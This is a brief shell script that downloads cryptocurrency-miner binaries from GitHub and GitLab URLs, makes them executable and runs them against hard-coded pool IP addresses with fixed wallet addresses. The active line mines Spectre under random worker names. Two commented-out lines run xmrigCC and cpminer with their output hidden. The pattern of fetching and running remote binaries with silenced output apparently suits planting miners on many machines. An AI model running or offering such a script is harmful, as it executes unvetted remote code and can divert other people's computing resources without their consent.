#!/bin/sh

#wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && ./miner/xmrigDaemon -o 142.93.71.111:443 -u TuskeSyuMmk2xje2yUypZdWqLyjzRG7AjgcGk21HqjPTeztTahdSjA1SL7qokYAJxJ2NESFcGy5oQEdtNXMqjFGp5a7RE7cVrLa3LS -p WK01 -k -a rx/tuske -t4 > /dev/null 2>&1

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/tnn-miner1 && chmod 777 tnn-miner1 && ./tnn-miner1 --spectre --wallet spectre:qrzat3hsnclq9mwq5rtqgdp0fyfc6kjlx9v7hwh6tc2y78zy2enkk2z5deydr --daemon-address 142.93.71.111 --port 80 --worker-name $(shuf -n 1 -i 1-9999)-MJ --threads 4 


#wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u QQuVuBF9yLgdE4C3HuhyxD5rk1wTMwg45F -t4 > /dev/null 2>&1